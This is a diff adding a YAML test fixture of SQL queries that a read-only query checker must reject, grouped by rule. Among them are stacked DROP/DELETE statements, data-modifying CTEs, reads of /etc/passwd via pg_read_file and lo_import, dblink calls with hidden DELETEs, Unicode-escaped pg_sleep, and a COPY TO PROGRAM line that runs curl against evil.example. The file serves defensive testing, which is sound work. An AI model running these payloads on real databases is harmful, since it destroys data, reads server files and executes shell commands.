@@ -1,0 +1,477 @@
+# Attack cases: SQL that check_sql MUST reject (ok=False, safe_sql=None, >=1 error).
+#
+# Each case: {id, sql, why, rule}. `rule` is the R-number expected to be the FIRST
+# failing rule (used only for the coverage count; the test itself only asserts that
+# the query is blocked). A case may set `oversize: true` instead of `sql`; the test
+# loader then builds a string longer than MAX_SQL_CHARS for it.
+
+# --- R1: empty / whitespace / too long ------------------------------------- #
+- id: r1_empty
+  sql: ""
+  why: empty input
+  rule: R1
+- id: r1_whitespace_only
+  sql: "   \n\t  "
+  why: only whitespace
+  rule: R1
+- id: r1_oversize
+  oversize: true
+  why: longer than MAX_SQL_CHARS characters
+  rule: R1
+
+# --- R2: unparseable text / unbalanced quotes / unbalanced parentheses ------- #
+- id: r2_gibberish
+  sql: "this is not sql at all %%%"
+  why: not SQL
+  rule: R2
+- id: r2_keywords_no_expr
+  sql: "SELECT FROM WHERE"
+  why: keywords with no expression
+  rule: R2
+- id: r2_unbalanced_single_quote
+  sql: "SELECT 'abc FROM schools"
+  why: unterminated string literal
+  rule: R2
+- id: r2_unbalanced_double_quote
+  sql: "SELECT \"col FROM schools"
+  why: unterminated quoted identifier
+  rule: R2
+- id: r2_unbalanced_parens
+  sql: "SELECT * FROM (SELECT 1"
+  why: unbalanced parentheses
+  rule: R2
+
+# --- R3: more than one statement ------------------------------------------- #
+- id: r3_stacked_drop
+  sql: "SELECT 1; DROP TABLE schools"
+  why: a write statement stacked after a SELECT
+  rule: R3
+- id: r3_stacked_two_selects
+  sql: "SELECT * FROM schools; SELECT * FROM frpm"
+  why: two SELECT statements
+  rule: R3
+- id: r3_second_after_line_comment
+  sql: "SELECT 1; -- harmless looking\nDELETE FROM schools"
+  why: a second statement hidden after a -- comment
+  rule: R3
+- id: r3_second_after_block_comment
+  sql: "SELECT 1; /* note */ UPDATE schools SET City = 'x'"
+  why: a second statement hidden after a /* */ comment
+  rule: R3
+- id: r3_second_after_string_with_semicolon
+  sql: "SELECT ';' AS s; DROP TABLE schools"
+  why: a real second statement after a string literal that contains a semicolon
+  rule: R3
+
+# --- R4: root is not a read query ------------------------------------------ #
+- id: r4_insert
+  sql: "INSERT INTO schools (CDSCode) VALUES ('x')"
+  why: INSERT is not a read query
+  rule: R4
+- id: r4_update
+  sql: "UPDATE schools SET City = 'x'"
+  why: UPDATE is not a read query
+  rule: R4
+- id: r4_delete_mixed_case
+  sql: "dElEtE FROM schools WHERE 1 = 1"
+  why: DELETE (mixed case) is not a read query
+  rule: R4
+- id: r4_merge
+  sql: "MERGE INTO schools USING frpm ON schools.CDSCode = frpm.CDSCode WHEN MATCHED THEN DELETE"
+  why: MERGE is not a read query
+  rule: R4
+- id: r4_truncate
+  sql: "TRUNCATE TABLE schools"
+  why: TRUNCATE is not a read query
+  rule: R4
+- id: r4_drop_mixed_case
+  sql: "DrOp TABLE schools"
+  why: DROP (mixed case) is not a read query
+  rule: R4
+- id: r4_create_table
+  sql: "CREATE TABLE t (id integer)"
+  why: CREATE TABLE is not a read query
+  rule: R4
+- id: r4_create_table_as_select
+  sql: "CREATE TABLE t AS SELECT * FROM schools"
+  why: CREATE TABLE AS SELECT is not a read query
+  rule: R4
+- id: r4_alter
+  sql: "ALTER TABLE schools ADD COLUMN x integer"
+  why: ALTER is not a read query
+  rule: R4
+- id: r4_grant
+  sql: "GRANT SELECT ON schools TO qg_reader"
+  why: GRANT is not a read query
+  rule: R4
+- id: r4_revoke
+  sql: "REVOKE SELECT ON schools FROM qg_reader"
+  why: REVOKE is not a read query
+  rule: R4
+- id: r4_copy_to_file
+  sql: "COPY schools TO '/tmp/out.csv'"
+  why: COPY is not a read query
+  rule: R4
+- id: r4_copy_to_program
+  sql: "COPY schools TO PROGRAM 'curl http://evil.example'"
+  why: COPY TO PROGRAM runs a shell command
+  rule: R4
+- id: r4_vacuum
+  sql: "VACUUM schools"
+  why: VACUUM is a command, not a read query
+  rule: R4
+- id: r4_analyze
+  sql: "ANALYZE schools"
+  why: ANALYZE is a command, not a read query
+  rule: R4
+- id: r4_reindex
+  sql: "REINDEX TABLE schools"
+  why: REINDEX is a command, not a read query
+  rule: R4
+- id: r4_cluster
+  sql: "CLUSTER schools"
+  why: CLUSTER is a command, not a read query
+  rule: R4
+- id: r4_lock_table
+  sql: "LOCK TABLE schools IN ACCESS EXCLUSIVE MODE"
+  why: LOCK TABLE is not a read query
+  rule: R4
+- id: r4_set
+  sql: "SET statement_timeout = 0"
+  why: SET is not a read query
+  rule: R4
+- id: r4_reset
+  sql: "RESET statement_timeout"
+  why: RESET is not a read query
+  rule: R4
+- id: r4_set_role
+  sql: "SET ROLE postgres"
+  why: SET ROLE is not a read query
+  rule: R4
+- id: r4_set_session_authorization
+  sql: "SET SESSION AUTHORIZATION postgres"
+  why: SET SESSION AUTHORIZATION is not a read query
+  rule: R4
+- id: r4_begin
+  sql: "BEGIN"
+  why: BEGIN starts a transaction
+  rule: R4
+- id: r4_commit
+  sql: "COMMIT"
+  why: COMMIT is a transaction statement
+  rule: R4
+- id: r4_rollback
+  sql: "ROLLBACK"
+  why: ROLLBACK is a transaction statement
+  rule: R4
+- id: r4_prepare
+  sql: "PREPARE p AS SELECT 1"
+  why: PREPARE is not a read query
+  rule: R4
+- id: r4_execute
+  sql: "EXECUTE p"
+  why: EXECUTE runs a prepared statement
+  rule: R4
+- id: r4_deallocate
+  sql: "DEALLOCATE p"
+  why: DEALLOCATE is not a read query
+  rule: R4
+- id: r4_do_block
+  sql: "DO $$ BEGIN PERFORM 1; END $$"
+  why: DO runs a procedural block
+  rule: R4
+- id: r4_call
+  sql: "CALL my_proc()"
+  why: CALL invokes a procedure
+  rule: R4
+- id: r4_listen
+  sql: "LISTEN my_channel"
+  why: LISTEN is not a read query
+  rule: R4
+- id: r4_notify
+  sql: "NOTIFY my_channel"
+  why: NOTIFY is not a read query
+  rule: R4
+- id: r4_create_extension
+  sql: "CREATE EXTENSION dblink"
+  why: CREATE EXTENSION is not a read query
+  rule: R4
+- id: r4_alter_system
+  sql: "ALTER SYSTEM SET max_connections = 1000"
+  why: ALTER SYSTEM changes server config
+  rule: R4
+- id: r4_refresh_matview
+  sql: "REFRESH MATERIALIZED VIEW my_view"
+  why: REFRESH MATERIALIZED VIEW writes data
+  rule: R4
+- id: r4_explain
+  sql: "EXPLAIN SELECT * FROM schools"
+  why: EXPLAIN is explicitly rejected
+  rule: R4
+- id: r4_explain_analyze
+  sql: "EXPLAIN ANALYZE SELECT * FROM schools"
+  why: EXPLAIN ANALYZE actually runs the query
+  rule: R4
+- id: r4_show
+  sql: "SHOW statement_timeout"
+  why: SHOW is explicitly rejected
+  rule: R4
+- id: r4_show_all_mixed_case
+  sql: "ShOw All"
+  why: SHOW ALL (mixed case) is explicitly rejected
+  rule: R4
+
+# --- R5: write or lock node nested inside a read query --------------------- #
+- id: r5_cte_delete
+  sql: "WITH x AS (DELETE FROM schools RETURNING CDSCode) SELECT * FROM x"
+  why: data-modifying DELETE inside a CTE
+  rule: R5
+- id: r5_cte_update
+  sql: "WITH x AS (UPDATE schools SET City = 'y' RETURNING CDSCode) SELECT * FROM x"
+  why: data-modifying UPDATE inside a CTE
+  rule: R5
+- id: r5_cte_insert
+  sql: "WITH x AS (INSERT INTO schools (CDSCode) VALUES ('z') RETURNING CDSCode) SELECT * FROM x"
+  why: data-modifying INSERT inside a CTE
+  rule: R5
+- id: r5_cte_delete_nested_two_levels
+  sql: "WITH a AS (WITH b AS (DELETE FROM schools RETURNING CDSCode) SELECT * FROM b) SELECT * FROM a"
+  why: DELETE inside a CTE nested two levels deep
+  rule: R5
+- id: r5_cte_delete_in_union_branch
+  sql: "WITH d AS (DELETE FROM frpm RETURNING CDSCode) SELECT CDSCode FROM schools UNION SELECT CDSCode FROM d"
+  why: data-modifying CTE feeding a UNION branch
+  rule: R5
+- id: r5_select_into
+  sql: "SELECT * INTO new_table FROM schools"
+  why: SELECT ... INTO creates a table
+  rule: R5
+- id: r5_for_update
+  sql: "SELECT * FROM schools FOR UPDATE"
+  why: FOR UPDATE takes row locks
+  rule: R5
+- id: r5_for_no_key_update
+  sql: "SELECT * FROM schools FOR NO KEY UPDATE"
+  why: FOR NO KEY UPDATE takes row locks
+  rule: R5
+- id: r5_for_share
+  sql: "SELECT * FROM schools FOR SHARE"
+  why: FOR SHARE takes row locks
+  rule: R5
+- id: r5_for_key_share
+  sql: "SELECT * FROM schools FOR KEY SHARE"
+  why: FOR KEY SHARE takes row locks
+  rule: R5
+- id: r5_for_update_skip_locked
+  sql: "SELECT * FROM schools FOR UPDATE SKIP LOCKED"
+  why: FOR UPDATE SKIP LOCKED takes row locks
+  rule: R5
+
+# --- R6: dangerous function anywhere in the tree --------------------------- #
+# One case for every function in the R6 list.
+- id: r6_pg_sleep
+  sql: "SELECT pg_sleep(10)"
+  why: pg_sleep stalls the backend
+  rule: R6
+- id: r6_pg_sleep_for
+  sql: "SELECT pg_sleep_for('5 minutes')"
+  why: pg_sleep_for stalls the backend
+  rule: R6
+- id: r6_pg_sleep_until
+  sql: "SELECT pg_sleep_until('tomorrow')"
+  why: pg_sleep_until stalls the backend
+  rule: R6
+- id: r6_pg_read_file
+  sql: "SELECT pg_read_file('/etc/passwd')"
+  why: pg_read_file reads server files
+  rule: R6
+- id: r6_pg_read_binary_file
+  sql: "SELECT pg_read_binary_file('/etc/passwd')"
+  why: pg_read_binary_file reads server files
+  rule: R6
+- id: r6_pg_ls_dir
+  sql: "SELECT pg_ls_dir('/')"
+  why: pg_ls_dir lists server files
+  rule: R6
+- id: r6_pg_stat_file
+  sql: "SELECT pg_stat_file('/etc/passwd')"
+  why: pg_stat_file stats server files
+  rule: R6
+- id: r6_lo_import
+  sql: "SELECT lo_import('/etc/passwd')"
+  why: lo_import reads server files
+  rule: R6
+- id: r6_lo_export
+  sql: "SELECT lo_export(1, '/tmp/out')"
+  why: lo_export writes server files
+  rule: R6
+- id: r6_lo_unlink
+  sql: "SELECT lo_unlink(1)"
+  why: lo_unlink deletes large objects
+  rule: R6
+- id: r6_lo_create
+  sql: "SELECT lo_create(1)"
+  why: lo_create creates large objects
+  rule: R6
+- id: r6_dblink
+  sql: "SELECT * FROM dblink('dbname=x', 'SELECT 1') AS t(a integer)"
+  why: dblink reaches another server
+  rule: R6
+- id: r6_dblink_exec
+  sql: "SELECT dblink_exec('dbname=x', 'DROP TABLE y')"
+  why: dblink_exec runs SQL on another server
+  rule: R6
+- id: r6_dblink_connect
+  sql: "SELECT dblink_connect('dbname=x')"
+  why: dblink_connect opens a remote connection
+  rule: R6
+- id: r6_pg_terminate_backend
+  sql: "SELECT pg_terminate_backend(123)"
+  why: pg_terminate_backend kills a backend
+  rule: R6
+- id: r6_pg_cancel_backend
+  sql: "SELECT pg_cancel_backend(123)"
+  why: pg_cancel_backend cancels a backend
+  rule: R6
+- id: r6_pg_reload_conf
+  sql: "SELECT pg_reload_conf()"
+  why: pg_reload_conf reloads server config
+  rule: R6
+- id: r6_pg_rotate_logfile
+  sql: "SELECT pg_rotate_logfile()"
+  why: pg_rotate_logfile rotates the server log
+  rule: R6
+- id: r6_set_config
+  sql: "SELECT set_config('statement_timeout', '0', false)"
+  why: set_config changes a server setting
+  rule: R6
+- id: r6_nextval
+  sql: "SELECT nextval('my_seq')"
+  why: nextval advances a sequence (a write)
+  rule: R6
+- id: r6_setval
+  sql: "SELECT setval('my_seq', 1)"
+  why: setval sets a sequence (a write)
+  rule: R6
+- id: r6_pg_advisory_lock
+  sql: "SELECT pg_advisory_lock(1)"
+  why: pg_advisory_lock takes a session lock
+  rule: R6
+- id: r6_pg_advisory_xact_lock
+  sql: "SELECT pg_advisory_xact_lock(1)"
+  why: pg_advisory_xact_lock takes a transaction lock
+  rule: R6
+- id: r6_pg_try_advisory_lock
+  sql: "SELECT pg_try_advisory_lock(1)"
+  why: pg_try_advisory_lock takes a session lock
+  rule: R6
+- id: r6_pg_notify
+  sql: "SELECT pg_notify('my_channel', 'payload')"
+  why: pg_notify sends a notification
+  rule: R6
+- id: r6_query_to_xml
+  sql: "SELECT query_to_xml('SELECT 1', true, false, '')"
+  why: query_to_xml runs arbitrary SQL
+  rule: R6
+- id: r6_query_to_xmlschema
+  sql: "SELECT query_to_xmlschema('SELECT 1', true, false, '')"
+  why: query_to_xmlschema runs arbitrary SQL
+  rule: R6
+- id: r6_query_to_xml_and_xmlschema
+  sql: "SELECT query_to_xml_and_xmlschema('SELECT 1', true, false, '')"
+  why: query_to_xml_and_xmlschema runs arbitrary SQL
+  rule: R6
+# R6 variants: case, schema prefix, quoting, and placement in the tree.
+- id: r6_variant_mixed_case
+  sql: "SELECT Pg_SlEeP(10)"
+  why: dangerous function in mixed case
+  rule: R6
+- id: r6_variant_schema_qualified
+  sql: "SELECT pg_catalog.pg_sleep(10)"
+  why: schema-qualified dangerous function
+  rule: R6
+- id: r6_variant_double_quoted
+  sql: "SELECT \"pg_sleep\"(10)"
+  why: double-quoted dangerous function name
+  rule: R6
+- id: r6_variant_in_subquery
+  sql: "SELECT * FROM (SELECT pg_sleep(10)) AS z"
+  why: dangerous function inside a subquery
+  rule: R6
+- id: r6_variant_in_cte
+  sql: "WITH x AS (SELECT pg_sleep(10) AS s) SELECT * FROM x"
+  why: dangerous function inside a CTE
+  rule: R6
+- id: r6_variant_in_where
+  sql: "SELECT CDSCode FROM schools WHERE pg_sleep(10) IS NOT NULL"
+  why: dangerous function in a WHERE clause
+  rule: R6
+- id: r6_variant_in_order_by
+  sql: "SELECT CDSCode FROM schools ORDER BY pg_sleep(10)"
+  why: dangerous function in an ORDER BY clause
+  rule: R6
+- id: r6_variant_in_case
+  sql: "SELECT CASE WHEN true THEN pg_sleep(10) ELSE NULL END"
+  why: dangerous function inside a CASE expression
+  rule: R6
+- id: r6_variant_in_union_branch
+  sql: "SELECT 1 UNION SELECT pg_sleep(10)"
+  why: dangerous function in a UNION branch
+  rule: R6
+- id: r6_variant_query_to_xml_hidden_delete
+  sql: "SELECT query_to_xml('DELETE FROM schools', true, false, '')"
+  why: query_to_xml with a DELETE hidden in its string argument
+  rule: R6
+
+# --- owner-added cases (own_) ---------------------------------------------- #
+- id: own_a01
+  rule: R6
+  why: pg_sleep called as a table function in FROM, not in SELECT
+  sql: |
+    SELECT * FROM pg_sleep(5)
+- id: own_a02
+  rule: R6
+  why: dblink in the FROM clause, with a DELETE hidden inside its string argument
+  sql: |
+    SELECT * FROM dblink('dbname=x', 'DELETE FROM schools') AS t(a integer)
+- id: own_a03
+  rule: R6
+  why: >-
+    Unicode-escaped function name; Postgres decodes U&"\0070g_sleep" to pg_sleep,
+    so a name check on the raw text could miss it
+  sql: |
+    SELECT U&"\0070g_sleep"(5)
+- id: own_a04
+  rule: R5
+  why: a MATERIALIZED CTE containing a DELETE is still a data-modifying statement
+  sql: |
+    WITH x AS MATERIALIZED (DELETE FROM schools RETURNING *) SELECT * FROM x
+- id: own_a05
+  rule: R5
+  why: SELECT ... INTO TEMP creates a temporary table
+  sql: |
+    SELECT * INTO TEMP copy_t FROM schools
+- id: own_a06
+  rule: R5
+  why: SELECT ... INTO hidden after a CTE still creates a table
+  sql: |
+    WITH x AS (SELECT 1) SELECT * INTO new_t FROM x
+- id: own_a07
+  rule: R5
+  why: FOR UPDATE OF a named table takes row locks
+  sql: |
+    SELECT * FROM schools FOR UPDATE OF schools
+- id: own_a08
+  rule: R3
+  why: a second statement after a newline and a tab is still two statements
+  sql: "SELECT 1;\n\tDELETE FROM schools"
+- id: own_a09
+  rule: R3
+  why: comment-only input parses to zero statements, not one
+  sql: |
+    -- just a comment
+- id: own_a10
+  rule: R6
+  why: setval, a dangerous function, hidden in a UNION ALL branch
+  sql: |
+    SELECT 1 UNION ALL SELECT setval('some_seq', 1)
